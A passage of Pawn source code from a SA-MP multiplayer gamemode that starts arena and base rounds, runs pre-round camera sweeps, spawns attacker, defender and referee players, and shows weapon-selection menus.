		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__ID ] = ArenaID;
		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__completed ] = false;
	}
    return 1;
}

forward ViewArenaForPlayers();
public ViewArenaForPlayers()
{

	if(ViewTimer == 0) {
	    SpawnPlayersInArena();
	    ResetTeamLeaders();
	    return 1;
	}

	foreach(new i : Player) {
	    if(Player[i][ToAddInRound] == true) {
	        PlayerPlaySound(i,1056,0.0,0.0,0.0);
			switch(ViewTimer)
			{
			    case 4: {
					SetPlayerCameraLookAt(i,ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2]);
	    	   		SetPlayerCameraPos(i,ACPSpawn[Current][0],ACPSpawn[Current][1]+100,ACPSpawn[Current][2]+80);
    			} case 3: {
         			InterpolateCameraPos(i,ACPSpawn[Current][0],ACPSpawn[Current][1]+100,ACPSpawn[Current][2]+80, ACPSpawn[Current][0]-100,ACPSpawn[Current][1],ACPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], 1000, CAMERA_MOVE);
		   		} case 2: {
	    	   		InterpolateCameraPos(i,ACPSpawn[Current][0]-100,ACPSpawn[Current][1],ACPSpawn[Current][2]+80, ACPSpawn[Current][0],ACPSpawn[Current][1]-100,ACPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], 1000, CAMERA_MOVE);
				} case 1: {
					InterpolateCameraPos(i,ACPSpawn[Current][0],ACPSpawn[Current][1]-100,ACPSpawn[Current][2]+80,ACPSpawn[Current][0]+100,ACPSpawn[Current][1],ACPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2], 1000, CAMERA_MOVE);
				}
			}
			new iString[64];
			if( GameType == TDM ) format(iString,sizeof(iString),"~w~TDM starting in ~r~~h~%d ~w~seconds", ViewTimer);
			else if( GameType == ARENA ) format(iString,sizeof(iString),"~w~Arena starting in ~r~~h~%d ~w~seconds", ViewTimer);
			TextDrawSetString( centerTeamNames, iString);
		}
	}
	ViewTimer--;

	return SetTimer("ViewArenaForPlayers", 1000, false);
}

SpawnPlayersInArena()
{
	foreach(new i : Player) {
        PlayerTextDrawHide(i, RoundText);

	    if(Player[i][ToAddInRound] == true) {
	        if(Player[i][Spectating] == true) StopSpectate(i);

	        Player[i][Playing] = true;
	        Player[i][WasInBase] = true;

			Player[i][RoundKills] = 0;
			Player[i][RoundDeaths] = 0;
			Player[i][RoundDamage] = 0;
			Player[i][shotsHit] = 0;

			PlayerPlaySound(i, 1057, 0, 0, 0);


	        SetPlayerVirtualWorld(i, 2);
	        SetPlayerInterior(i, AInterior[Current]);

			SetAP(i, RoundAR);
			SetHP(i, RoundHP);

			switch(Player[i][Team]) {
			    case ATTACKER: {
       				if(AInterior[Current] == 0) SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], AAttackerSpawn[Current][0] + random(6), AAttackerSpawn[Current][1] + random(6), AAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
					else SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], AAttackerSpawn[Current][0] + random(2), AAttackerSpawn[Current][1] + random(2), AAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
					
			        SetPlayerColor(i, ATTACKER_PLAYING);
			        SpawnPlayerEx(i);
                    SAMP_SetPlayerTeam(i, 1);
                    if(TeamHPDamage == true) {
						TextDrawShowForPlayer(i, AttackerTeam[0]);
						TextDrawShowForPlayer(i, AttackerTeam[1]);
					}
				} case DEFENDER: {
				    if(AInterior[Current] == 0) SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], ADefenderSpawn[Current][0] + random(6), ADefenderSpawn[Current][1] + random(6), ADefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
        			else SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], ADefenderSpawn[Current][0] + random(2), ADefenderSpawn[Current][1] + random(2), ADefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);

					SetPlayerColor(i, DEFENDER_PLAYING);
					SpawnPlayerEx(i);
					SAMP_SetPlayerTeam(i, 2);
			        if(TeamHPDamage == true) {
						TextDrawShowForPlayer(i, DefenderTeam[0]);
						TextDrawShowForPlayer(i, DefenderTeam[1]);
					}
				}
			}


            SetCameraBehindPlayer(i);
			if(RoundPaused == false) TogglePlayerControllableEx(i, true);
			else TogglePlayerControllableEx(i, false);
            Player[i][ToAddInRound] = false;
			GivePlayerArenaWeapons(i);

			new iString[160];
			if(Player[i][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
			else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
			PlayerTextDrawSetString(i, RoundKillDmgTDmg, iString);
		}

		switch(Player[i][Team]) {
			case ATTACKER_SUB: {
                if(TeamHPDamage == true) {
					TextDrawShowForPlayer(i, AttackerTeam[0]);
					TextDrawShowForPlayer(i, AttackerTeam[1]);
				}
			} case DEFENDER_SUB: {
		        if(TeamHPDamage == true) {
					TextDrawShowForPlayer(i, DefenderTeam[0]);
					TextDrawShowForPlayer(i, DefenderTeam[1]);
				}
			}
		}
	}

	ClearChat();

	RoundMints = ConfigRoundTime;
	#if ENABLED_TDM == 1
	if( GameType == TDM )
	    RoundMints = DEFAULT_TDM_TIME;
	#endif
	RoundSeconds = 0;

    foreach(new i:Player)
    {
		if(Player[i][Style] == 0) TextDrawShowForPlayer(i, RoundStats);
		else ShowRoundStats(i);
	}

	AllowStartBase = true;
	ArenaStarted = true;
	FallProtection = true;
	RadarFix();
}

forward AddPlayerToArena(playerid);
public AddPlayerToArena(playerid)
{
	if(Player[playerid][Spectating] == true) {
		StopSpectate(playerid);
		SetTimerEx("AddPlayerToArena", 500, false, "i", playerid);
		return 1;
	}

    PlayerTextDrawHide(playerid, RoundText);

	if(Player[playerid][InDM] == true) { //Make sure to remove player from DM, otherwise the player will have Player[playerid][Playing] = true and Player[playerid][InDM] = true, so you are saying that the player is both in Base and in DM.
	    Player[playerid][InDM] = false;
		Player[playerid][DMReadd] = 0;
	}
	Player[playerid][AntiLag] = false;

	if(Player[playerid][LastVehicle] != -1) {
		DestroyVehicle(Player[playerid][LastVehicle]);
		Player[playerid][LastVehicle] = -1;
	}

    Player[playerid][Playing] = true;
    Player[playerid][WasInBase] = true;
    Player[playerid][ToAddInRound] = false;
	Player[playerid][RoundKills] = 0;
	Player[playerid][RoundDeaths] = 0;
	Player[playerid][RoundDamage] = 0;
	Player[playerid][shotsHit] = 0;

	PlayerPlaySound(playerid, 1057, 0, 0, 0);
	SetCameraBehindPlayer(playerid);

	SetAP(playerid, RoundAR);
	SetHP(playerid, RoundHP);

	SetPlayerVirtualWorld(playerid, 2);
	SetPlayerInterior(playerid, AInterior[Current]);
	
	switch(Player[playerid][Team]) {
	    case ATTACKER: {
	        SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], AAttackerSpawn[Current][0] + random(2), AAttackerSpawn[Current][1] + random(2), AAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
			SetPlayerMapIcon(playerid, 59, AAttackerSpawn[Current][0], AAttackerSpawn[Current][1], AAttackerSpawn[Current][2], 59, 0, MAPICON_GLOBAL);

			SpawnPlayerEx(playerid);
	        SetPlayerColor(playerid, ATTACKER_PLAYING);

            SAMP_SetPlayerTeam(playerid, 1);
            if(TeamHPDamage == true) {
	           	TextDrawShowForPlayer(playerid, AttackerTeam[0]);
				TextDrawShowForPlayer(playerid, AttackerTeam[1]);
				TextDrawHideForPlayer(playerid, DefenderTeam[0]);
				TextDrawHideForPlayer(playerid, DefenderTeam[1]);
			}
		} case DEFENDER: {
		    SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], ADefenderSpawn[Current][0] + random(2), ADefenderSpawn[Current][1] + random(2), ADefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);

			SpawnPlayerEx(playerid);
	        SetPlayerColor(playerid, DEFENDER_PLAYING);
	        SAMP_SetPlayerTeam(playerid, 2);
	        if(TeamHPDamage == true) {
				TextDrawShowForPlayer(playerid, DefenderTeam[0]);
				TextDrawShowForPlayer(playerid, DefenderTeam[1]);
	           	TextDrawHideForPlayer(playerid, AttackerTeam[0]);
				TextDrawHideForPlayer(playerid, AttackerTeam[1]);
			}
		} case REFEREE: {
	        SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], ACPSpawn[Current][0] + random(2), ACPSpawn[Current][1] + random(2), ACPSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
			SpawnPlayerEx(playerid);
	        SetPlayerColor(playerid, REFEREE_COLOR);
	        SAMP_SetPlayerTeam(playerid, 3);
		}
	}

	GivePlayerArenaWeapons(playerid);

	if(RoundPaused == false) TogglePlayerControllableEx(playerid, true);
	else TogglePlayerControllableEx(playerid, false);


	new iString[160];
	if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

	RadarFix();
	return 1;
}

GivePlayerArenaWeapons(playerid)
{
	ResetPlayerWeapons(playerid);

	if( GameType == ARENA )
	{
		if(Player[playerid][Team] != REFEREE) {
			MenuID[playerid] = 1;
			ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
		}
	}
	#if ENABLED_TDM == 1
	else if( GameType == TDM )
	{
	    GivePlayerWeapon( playerid, DEAGLE ,9999);
	    GivePlayerWeapon( playerid, M4 , 	9999);
	    GivePlayerWeapon( playerid, MP5, 	9999 );
	    GivePlayerWeapon( playerid, SHOTGUN,9999 );
	    GivePlayerWeapon( playerid, SNIPER, 9999 );
	    SetPlayerArmedWeapon( playerid, 0 );
	}
	#endif
	return 1;
}

//------------------------------------------------------------------------------
// Base System
//------------------------------------------------------------------------------

forward OnBaseStart(BaseID);
public OnBaseStart(BaseID)
{
	ClearKillList(); // Clears the kill-list.
    DestroyAllVehicles(); // Destroys (removes) all the spawned vehicles
	Current = BaseID; // Current will be the ID of the base that we just started. We do this so that we can use this ID later on (e.g. check /car command for the use).
   	ClearKillList(); // Clears the kill-list.
    ServerLastPlayed = Current;
    ServerLastPlayedType = 1;

	PlayersInCP = 0;
 	ElapsedTime = 0;
	CurrentCPTime = ConfigCPTime;
    SetRecentRound(BaseID, BASE);

	if(BasesPlayed >= MAX_BASES) {
	    for(new i = 0; i < MAX_BASES; i++) {
			RecentBase[i] = -1;
		}
		BasesPlayed = 0;
	}

 	for( new i; i < 10; i ++ ) { // Reset the number of times a weapon is picked for each team.
        TimesPicked[ATTACKER][i] = 0;
        TimesPicked[DEFENDER][i] = 0;
    }

    new iString[64];
	format(iString, sizeof(iString), "%sBase %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);

	for(new i = 0; i < MAX_BASES; i++)
	{
		VoteCount[i] = 0;
	}

	foreach(new i : Player) {
		Player[i][LastVehicle] = -1;

		if(Player[i][Style] == 0) PlayerTextDrawShow(i, RoundText);
		else ShowRoundStats(i);
		TextDrawSetString( leftTeamData, "_");
		TextDrawSetString( rightTeamData, "_");
		TextDrawSetString( centerTeamNames, "_");
		TextDrawSetString( timerCenterTD, "_");

		Player[i][WasInCP] = false;


	    if(Player[i][ToAddInRound] == true) {

			if(Player[i][Team] != ATTACKER && Player[i][Team] != DEFENDER && Player[i][Team] != REFEREE)
			{
			    Player[i][ToAddInRound] = false;
			    continue;
	        }
            HideEndRoundTextDraw(i);

			if(Player[i][Spectating] == true) StopSpectate(i);
			if(Player[i][InDM] == true) { // Make sure to remove player from DM, otherwise the player will have Player[playerid][Playing] = true and Player[playerid][InDM] = true, so you are saying that the player is both in Base and in DM.
			    Player[i][InDM] = false;
    			Player[i][DMReadd] = 0;
			}
			Player[i][AntiLag] = false;

			Player[i][Playing] = true;

	        SetPlayerVirtualWorld(i, 2); // Set player virtual world to something different that that for lobby and DM so that they don't collide with each other. e.g. You shouldn't be able to see players in lobby or DM while you are in base.
	        SetPlayerInterior(i, BInterior[Current]);
			TogglePlayerControllableEx(i, false); //Pause players.
			SetPlayerCameraLookAt(i,BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2]);
			SetPlayerCameraPos(i,BCPSpawn[Current][0]+100,BCPSpawn[Current][1],BCPSpawn[Current][2]+80);
			SetPlayerPos(i, BCPSpawn[Current][0]+10, BCPSpawn[Current][1]+10, BCPSpawn[Current][2]);
			SetPlayerCheckpoint(i, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2); // Set checkpoint location and size.
		}

		PlayerTextDrawSetString(i, BaseID_VS, iString);
	}

	CPZone = GangZoneCreate(BCPSpawn[Current][0]-50, BCPSpawn[Current][1]-50, BCPSpawn[Current][0]+50, BCPSpawn[Current][1]+50);
	GangZoneShowForAll(CPZone, 0xFF000044);
	ViewTimer = 4;
	ViewBaseForPlayers();

	format(iString, sizeof(iString), "mapname Base: %d", Current); //Will change the map name in samp.exe to your base id (e.g. Base: 4)
	SendRconCommand(iString);

	format(iString, sizeof(iString), "%s: %d - %s: %d", TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	SetGameModeText(iString);

	if( WarMode == true )
	{
	    MatchRoundsStarted++;
	    if( MatchRoundsStarted > 100 ) MatchRoundsStarted = 1;
		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__type ] = 0;
		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__ID ] = BaseID;
		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__completed ] = false;
	}
    return 1;
}


forward ViewBaseForPlayers();
public ViewBaseForPlayers()
{
	if(ViewTimer == 0) {
	    SpawnPlayersInBase();
	    ResetTeamLeaders();
	    return 1;
	}

	foreach(new i : Player) {
		if(Player[i][ToAddInRound] == true)
		{
	        PlayerPlaySound(i,1056,0.0,0.0,0.0);
			switch(ViewTimer)
			{
			    case 4: {
					SetPlayerCameraLookAt(i,BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2]);
	    	   		SetPlayerCameraPos(i,BCPSpawn[Current][0],BCPSpawn[Current][1]+100,BCPSpawn[Current][2]+80);
    			} case 3: {
         			InterpolateCameraPos(i,BCPSpawn[Current][0],BCPSpawn[Current][1]+100,BCPSpawn[Current][2]+80, BCPSpawn[Current][0]-100,BCPSpawn[Current][1],BCPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], 1000, CAMERA_MOVE);
		   		} case 2: {
	    	   		InterpolateCameraPos(i,BCPSpawn[Current][0]-100,BCPSpawn[Current][1],BCPSpawn[Current][2]+80, BCPSpawn[Current][0],BCPSpawn[Current][1]-100,BCPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], 1000, CAMERA_MOVE);
				} case 1: {
					InterpolateCameraPos(i,BCPSpawn[Current][0],BCPSpawn[Current][1]-100,BCPSpawn[Current][2]+80,BCPSpawn[Current][0]+100,BCPSpawn[Current][1],BCPSpawn[Current][2]+80, 1000, CAMERA_MOVE);
                    InterpolateCameraLookAt(i,BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], BCPSpawn[Current][0],BCPSpawn[Current][1],BCPSpawn[Current][2], 1000, CAMERA_MOVE);
				}
			}

			new iString[64];
			format(iString,sizeof(iString),"~w~Base starting in ~r~~h~%d ~w~seconds", ViewTimer);
			//PlayerTextDrawSetString(i, RoundText, iString);
			TextDrawSetString( centerTeamNames, iString);
		}
	}

	ViewTimer--;

	return SetTimer("ViewBaseForPlayers", 1000, false);
}


SpawnPlayersInBase()
{
	foreach(new i : Player) {
        PlayerTextDrawHide(i, RoundText);

	    if(Player[i][ToAddInRound] == true)
		{
			if(Player[i][InDM] == true)
			{ //Make sure to remove player from DM, otherwise the player will have Player[playerid][Playing] = true and Player[playerid][InDM] = true, so you are saying that the player is both in Base and in DM.
			    Player[i][InDM] = false;
    			Player[i][DMReadd] = 0;
			}
			Player[i][AntiLag] = false;

            if(Player[i][Spectating] == true) StopSpectate(i);

	        Player[i][Playing] = true;
	        Player[i][WasInBase] = true;
			Player[i][RoundKills] = 0;
			Player[i][RoundDeaths] = 0;
			Player[i][RoundDamage] = 0;
			Player[i][shotsHit] = 0;

			PlayerPlaySound(i, 1057, 0, 0, 0);
			SetCameraBehindPlayer(i);

			SetAP(i, RoundAR);
			SetHP(i, RoundHP);

	        SetPlayerVirtualWorld(i, 2); //Set player virtual world to something different that that for lobby and DM so that they don't collide with each other. e.g. You shouldn't be able to see players in lobby or DM while you are in base.
	        SetPlayerInterior(i, BInterior[Current]);

			switch(Player[i][Team]) {
			    case ATTACKER: {
			        if(BInterior[Current] == 0) SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], BAttackerSpawn[Current][0] + random(6), BAttackerSpawn[Current][1] + random(6), BAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
					else SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], BAttackerSpawn[Current][0] + random(2), BAttackerSpawn[Current][1] + random(2), BAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);

					SetPlayerCheckpoint(i, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
				    SetPlayerColor(i, ATTACKER_PLAYING);
				    SpawnPlayerEx(i);
           			SetPlayerMapIcon(i, 59, BAttackerSpawn[Current][0], BAttackerSpawn[Current][1], BAttackerSpawn[Current][2], 59, 0, MAPICON_GLOBAL);
                    SAMP_SetPlayerTeam(i, ATTACKER);
                    if(TeamHPDamage == true) {
						TextDrawShowForPlayer(i, AttackerTeam[0]);
						TextDrawShowForPlayer(i, AttackerTeam[1]);
					}
				} case DEFENDER: {
			        if(BInterior[Current] == 0) SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], BDefenderSpawn[Current][0] + random(6), BDefenderSpawn[Current][1] + random(6), BDefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
					else  SetSpawnInfoEx(i, Player[i][Team], Skin[Player[i][Team]], BDefenderSpawn[Current][0] + random(2), BDefenderSpawn[Current][1] + random(2), BDefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
					Player[i][IgnoreSpawn] = true;
					SetPlayerCheckpoint(i, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
					SetPlayerColor(i, DEFENDER_PLAYING);
					SpawnPlayerEx(i);
			        SAMP_SetPlayerTeam(i, DEFENDER);
			        if(TeamHPDamage == true) {
						TextDrawShowForPlayer(i, DefenderTeam[0]);
						TextDrawShowForPlayer(i, DefenderTeam[1]);
					}
				}
			}



			if(RoundPaused == false) TogglePlayerControllableEx(i, true);
			else TogglePlayerControllableEx(i, false);
			Player[i][ToAddInRound] = false;

			ShowPlayerWeaponMenu(i, Player[i][Team]);

			new iString[160];
			if(Player[i][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
			else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
			PlayerTextDrawSetString(i, RoundKillDmgTDmg, iString);
		}

		switch(Player[i][Team]) {
			case ATTACKER_SUB: {
                if(TeamHPDamage == true) {
					TextDrawShowForPlayer(i, AttackerTeam[0]);
					TextDrawShowForPlayer(i, AttackerTeam[1]);
				}
			} case DEFENDER_SUB: {
		        if(TeamHPDamage == true) {
					TextDrawShowForPlayer(i, DefenderTeam[0]);
					TextDrawShowForPlayer(i, DefenderTeam[1]);
				}
			}
		}
	}

	ClearChat();



	RoundMints = ConfigRoundTime;
	RoundSeconds = 0;

	foreach(new i:Player)
	{
		if(Player[i][Style] == 0) TextDrawShowForPlayer(i, RoundStats);
		else ShowRoundStats(i);
	}

	AllowStartBase = true;
	BaseStarted = true;
    FallProtection = true;
	RadarFix();
    return 1;
}

forward AddPlayerToBase(playerid);
public AddPlayerToBase(playerid)
{
	if(Player[playerid][Spectating] == true) {
		StopSpectate(playerid);
		SetTimerEx("AddPlayerToBase", 500, false, "i", playerid);
		return 1;
	}

    PlayerTextDrawHide(playerid, RoundText);

	if(Player[playerid][InDM] == true) { //Make sure to remove player from DM, otherwise the player will have Player[playerid][Playing] = true and Player[playerid][InDM] = true, so you are saying that the player is both in Base and in DM.
	    Player[playerid][InDM] = false;
		Player[playerid][DMReadd] = 0;
	}
	Player[playerid][AntiLag] = false;
	if(Player[playerid][LastVehicle] != -1) {
		DestroyVehicle(Player[playerid][LastVehicle]);
//		Delete3DTextLabel(Vehicle3DText[Player[playerid][LastVehicle]]);
		Player[playerid][LastVehicle] = -1;
	}

	if(Player[playerid][WasInBase] == false) {
		Player[playerid][RoundKills] = 0;
		Player[playerid][RoundDeaths] = 0;
		Player[playerid][RoundDamage] = 0;
	    Player[playerid][shotsHit] = 0;
	}

    Player[playerid][Playing] = true;
    Player[playerid][WasInBase] = true;

	PlayerPlaySound(playerid, 1057, 0, 0, 0);
	SetCameraBehindPlayer(playerid);

	SetAP(playerid, RoundAR);
	SetHP(playerid, RoundHP);

    Player[playerid][ReaddOrAddTickCount] = GetTickCount();

    SetPlayerVirtualWorld(playerid, 2); //Set player virtual world to something different that that for lobby and DM so that they don't collide with each other. e.g. You shouldn't be able to see players in lobby or DM while you are in base.
    SetPlayerInterior(playerid, BInterior[Current]);

	switch(Player[playerid][Team]) {
	    case ATTACKER: {
	        SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], BAttackerSpawn[Current][0] + random(2), BAttackerSpawn[Current][1] + random(2), BAttackerSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
//			Player[playerid][IgnoreSpawn] = true;
			SpawnPlayerEx(playerid);
			SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
	        SetPlayerColor(playerid, ATTACKER_PLAYING);
   			SetPlayerMapIcon(playerid, 59, BAttackerSpawn[Current][0], BAttackerSpawn[Current][1], BAttackerSpawn[Current][2], 59, 0, MAPICON_GLOBAL);
            SAMP_SetPlayerTeam(playerid, ATTACKER);
            if(TeamHPDamage == true) {
				TextDrawShowForPlayer(playerid, AttackerTeam[0]);
				TextDrawShowForPlayer(playerid, AttackerTeam[1]);
				TextDrawHideForPlayer(playerid, DefenderTeam[0]);
				TextDrawHideForPlayer(playerid, DefenderTeam[1]);
			}
		} case DEFENDER: {
	        SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], BDefenderSpawn[Current][0] + random(2), BDefenderSpawn[Current][1] + random(2), BDefenderSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
//			Player[playerid][IgnoreSpawn] = true;
			SpawnPlayerEx(playerid);
			SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
	        SetPlayerColor(playerid, DEFENDER_PLAYING);
	        SAMP_SetPlayerTeam(playerid, DEFENDER);
	        if(TeamHPDamage == true) {
				TextDrawShowForPlayer(playerid, DefenderTeam[0]);
				TextDrawShowForPlayer(playerid, DefenderTeam[1]);
				TextDrawHideForPlayer(playerid, AttackerTeam[0]);
				TextDrawHideForPlayer(playerid, AttackerTeam[1]);
			}
		} case REFEREE: {
	        SetSpawnInfoEx(playerid, Player[playerid][Team], Skin[Player[playerid][Team]], BCPSpawn[Current][0] + random(2), BCPSpawn[Current][1] + random(2), BCPSpawn[Current][2]+0.5, 0, 0, 0, 0, 0, 0, 0);
//			Player[playerid][IgnoreSpawn] = true;
			SpawnPlayerEx(playerid);
			SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
	        SetPlayerColor(playerid, REFEREE_COLOR);
	        SAMP_SetPlayerTeam(playerid, REFEREE);
		}
	}

	if(RoundPaused == false) TogglePlayerControllableEx(playerid, true);
	else TogglePlayerControllableEx(playerid, false);

    Player[playerid][ToAddInRound] = false;

	ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);

	new iString[160];
	if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

/*	foreach(new i : Player) {
	    OnPlayerStreamIn(i, playerid);
	    OnPlayerStreamIn(playerid, i);
	} */

	RadarFix();
	return 1;
}

ShowPlayerWeaponMenu(playerid, team)
{
	TogglePlayerControllableEx(playerid, false);

	ResetPlayerWeapons(playerid);

	Player[playerid][OnGunmenu] = true;

	if(Player[playerid][WeaponPicked] > 0){
 		TimesPicked[Player[playerid][Team]][Player[playerid][WeaponPicked]-1]--;
 		Player[playerid][WeaponPicked] = 0;
	}

	new WepTStr[700];
	switch(team) {
	    case ATTACKER: {
	        format(WepTStr, sizeof(WepTStr), "{FFFFFF}ID\tPrimary Weapon\tSecondary Weapon\tAvailibility\n");
	        for(new i=0; i < 10; ++i) {
	            new str[100];
	            new tabs[7] = "";

				if(GunMenuWeapons[i][1] != 25 && GunMenuWeapons[i][1] != 23) {
				    tabs = "\t";
				}

	            if( i % 2 == 0) format(str, sizeof(str), "{FFFFFF}%d{FF0000}\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
	            else format(str, sizeof(str), "{FFFFFF}%d{FF4444}\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
	            strcat(WepTStr, str);
	        }

 			ShowPlayerDialog(playerid, DIALOG_WEAPONS_TYPE, DIALOG_STYLE_LIST, "{FFFFFF}Select your weapon set:",WepTStr, "Select", "");
		} case DEFENDER: {

		    format(WepTStr, sizeof(WepTStr), "{FFFFFF}ID\tPrimary Weapon\tSecondary Weapon\tAvailibility\n");
	        for(new i=0; i < 10; ++i) {
	            new str[100];
	            new tabs[7] = "";

				if(GunMenuWeapons[i][1] != 25 && GunMenuWeapons[i][1] != 23) {
				    tabs = "\t";
				}

	            if( i % 2 == 0) format(str, sizeof(str), "{FFFFFF}%d{3344FF}\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[DEFENDER][i]);
